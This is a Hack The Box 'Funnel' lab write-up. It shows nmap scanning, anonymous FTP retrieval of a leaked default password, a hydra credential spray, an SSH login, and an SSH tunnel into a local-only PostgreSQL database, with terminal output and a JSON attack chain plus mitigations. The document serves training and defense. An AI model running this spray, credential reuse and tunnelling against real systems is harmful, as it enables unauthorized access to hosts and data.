# HTB Funnel - FTP Credential Discovery and PostgreSQL Tunnel Access

Scope: authorized HTB lab only.
Focus: anonymous FTP data exposure, credential reuse, SSH foothold, and internal PostgreSQL access via local port forwarding.

---

## 1. Investigation Objective

1. Identify externally reachable services.
2. Extract credential intelligence from FTP artifacts.
3. Gain host access through recovered credentials.
4. Pivot to internal-only PostgreSQL service using SSH tunneling.
5. Enumerate database and extract target artifact.

---

## 2. External Recon

```bash
nmap -sV -sC <TARGET_IP>
```

Key findings:
- `21/tcp` vsftpd 3.0.3 (anonymous login enabled)
- `22/tcp` OpenSSH 8.2p1

---

## 3. Anonymous FTP Enumeration

```bash
ftp anonymous@<TARGET_IP>
```

Download relevant files:

```bash
get Welcome_28112022
get password_policy.pdf
```

Extracted intelligence:
- likely username candidate from welcome message: `christine`
- default credential from policy document: `funnel123#!#`

---

## 4. Credential Validation and Foothold

Optional credential spray check:

```bash
hydra -L username.txt -p 'funnel123#!#' ftp://<TARGET_IP>
```

Validated SSH login:

```bash
ssh christine@<TARGET_IP>
```

---

## 5. Internal Service Discovery on Host

```bash
ss -tln
```

Critical finding:
- `127.0.0.1:5432` (PostgreSQL listening locally only)

This explains why direct external nmap did not show PostgreSQL.

---

## 6. SSH Local Port Forwarding to PostgreSQL

Create tunnel:

```bash
ssh -L 1234:localhost:5432 christine@<TARGET_IP>
```

Install local client if needed:

```bash
sudo apt install postgresql-client
```

Connect through tunnel:

```bash
psql -U christine -h localhost -p 1234
```

Database enumeration:

```sql
\l
\c secrets
\dt
SELECT * FROM flag;
```

---

## 7. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sV -sC 10.129.227.162
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1

analyst@kali:~$ ftp anonymous@10.129.227.162
230 Login successful.
ftp> ls
mail_backup
ftp> get Welcome_28112022
ftp> get password_policy.pdf

analyst@kali:~$ ssh christine@10.129.227.162
password: funnel123#!#
christine@funnel:~$ ss -tln
LISTEN 0  128 127.0.0.1:5432  0.0.0.0:*

analyst@kali:~$ ssh -L 1234:localhost:5432 christine@10.129.227.162
[tunnel established]

analyst@kali:~$ psql -U christine -h localhost -p 1234
christine=> \c secrets
You are now connected to database "secrets".
secrets=> SELECT * FROM flag;
HTB{...flag...}
```

---

## 8. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "funnel_ftp_leak_to_postgres_tunnel",
	"input_signals": [
		"Anonymous FTP enabled and readable artifacts exposed",
		"Password policy file leaked default password",
		"Recovered credentials valid over SSH",
		"Internal PostgreSQL bound to localhost",
		"SSH tunnel enabled remote database access"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Network Service Discovery",
			"confidence": 0.95,
			"evidence": "nmap identified FTP and SSH services"
		},
		{
			"step": 2,
			"tactic": "credential_access",
			"technique": "Unsecured Credentials",
			"confidence": 0.92,
			"evidence": "password_policy.pdf exposed reusable default password"
		},
		{
			"step": 3,
			"tactic": "initial_access",
			"technique": "Valid Accounts",
			"confidence": 0.9,
			"evidence": "credential pair authenticated over SSH"
		},
		{
			"step": 4,
			"tactic": "lateral_movement",
			"technique": "Port Forwarding",
			"confidence": 0.88,
			"evidence": "SSH local forwarding exposed internal PostgreSQL"
		},
		{
			"step": 5,
			"tactic": "collection",
			"technique": "Data from Information Repositories",
			"confidence": 0.91,
			"evidence": "query to secrets.flag returned target value"
		}
	],
	"hypotheses": [
		"Default password policy likely affects additional accounts",
		"Internal-only services may include more sensitive data stores",
		"FTP backup artifacts may contain further credentials or key material"
	],
	"uncertainties": [
		"Role privileges of christine inside PostgreSQL not fully mapped",
		"Unknown if password reused across infrastructure",
		"No direct evidence of monitoring for SSH tunnel abuse"
	],
	"tool_calls": [
		{"name": "ftp_artifact_parser", "priority": "high"},
		{"name": "credential_policy_exposure_checker", "priority": "high"},
		{"name": "internal_service_tunnel_mapper", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable anonymous FTP access",
			"Rotate default and leaked credentials",
			"Restrict SSH user access and enforce key-based auth"
		],
		"hardening": [
			"Segment internal databases from user shells",
			"Enforce strong password policy with no static defaults",
			"Remove sensitive operational data from public/anonymous shares"
		],
		"monitoring": [
			"Alert on FTP anonymous downloads of policy/backup files",
			"Monitor SSH tunneling behavior and unusual local forwards",
			"Track abnormal database access from localhost tunnels"
		]
	}
}
```